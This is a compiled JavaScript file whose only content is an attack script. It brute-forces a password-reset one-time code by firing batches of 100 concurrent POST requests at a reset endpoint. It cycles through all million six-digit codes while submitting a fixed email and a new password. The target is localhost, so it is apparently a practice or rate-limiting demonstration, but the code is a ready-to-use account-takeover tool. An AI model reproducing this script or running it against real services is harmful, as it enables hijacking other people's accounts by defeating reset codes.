"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
const sendRequest = (otp) => __awaiter(void 0, void 0, void 0, function* () {
    const data = JSON.stringify({
        email: "varad@gmail.com",
        otp: `${otp}`,
        newPassword: "1234564567"
    });
    const config = {
        method: "post",
        maxBodyLength: Infinity,
        url: "http://localhost:3000/reset-password",
        headers: {
            "Content-Type": "application/json"
        },
        data: data
    };
    try {
        const response = yield axios_1.default.request(config);
        console.log(response.data);
    }
    catch (error) {
        console.error(`Error for OTP ${otp}:`);
    }
});
const bruteForce = () => __awaiter(void 0, void 0, void 0, function* () {
    for (let i = 0; i < 1000000; i += 100) {
        const promises = [];
        console.log(`Processing batch starting with OTP ${i}`);
        for (let j = 0; j < 100; j++) {
            promises.push(sendRequest(i + j));
        }
        try {
            yield Promise.all(promises); // Wait for all requests in the batch to complete
        }
        catch (error) {
            console.error("Batch processing failed:", error);
        }
    }
});
bruteForce();
